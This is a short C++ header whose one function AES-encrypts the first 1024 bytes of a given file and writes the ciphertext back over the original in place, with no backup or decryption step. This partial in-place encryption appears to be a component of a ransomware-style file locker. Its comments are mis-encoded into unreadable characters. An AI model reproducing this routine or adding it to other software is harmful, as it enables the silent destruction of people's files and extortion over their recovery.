#pragma once
#include <fstream>
#include <string>
#include "var.h"
#include "aes.h"
using std::string;
using std::ios;
using std::ifstream;
using std::fstream;
/*����һ���ļ�*/
void fileEncryptFunc(string FilePath)
{
	ifstream f_in(FilePath.c_str(), ios::in | ios::binary);
	char input_buf[1024];
	char output_buf[1024];
	unsigned long long FileSize = 0; //�ļ���С
	int temp = 0;

	f_in.seekg(0, ios::end);
	FileSize = f_in.tellg(); //��ȡ��С
	f_in.seekg(0, ios::beg);
	if (FileSize < 1024 && FileSize >= 16)
	{
		temp = FileSize / 16;
		temp = temp * 16;
		f_in.read(input_buf, temp);
		AesEn((unsigned char*)input_buf, (unsigned char*)output_buf, temp);
	}
	else if (FileSize >= 1024)
	{
		f_in.read(input_buf, 1024);
		AesEn((unsigned char*)input_buf, (unsigned char*)output_buf, 1024);
		temp = 1024;
	}
	else //����16�ֽ�����(128λ����)���ļ�
	{
		return;
	}
	f_in.close();
	//rename(inputFilePath.c_str(), outputFilePath.c_str());
	fstream f_out(FilePath.c_str(), ios::out | ios::in | ios::binary);
	f_out.write(output_buf, temp);
	f_out.close();
}